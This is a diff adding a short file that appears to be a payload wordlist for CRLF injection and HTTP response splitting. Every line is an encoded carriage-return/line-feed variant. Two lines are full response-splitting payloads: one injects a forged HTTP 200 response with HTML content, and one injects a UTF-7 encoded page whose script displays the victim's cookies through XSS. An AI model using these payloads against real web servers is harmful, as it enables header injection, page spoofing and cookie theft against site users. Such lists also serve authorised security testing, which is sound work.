@@ -1,0 +1,11 @@
+%0d%0a
+%0d%0a%0d%0a
+r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>
+%0d%0d%0a%0a
+0x0D0x0A
+0x0D0x0D0x0A0x0A
+\r\n
+%5cr%5cn
+%0%0d%0ad%0%0d%0aa
+%0%0D%0AD%0%0D%0AA
+%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4
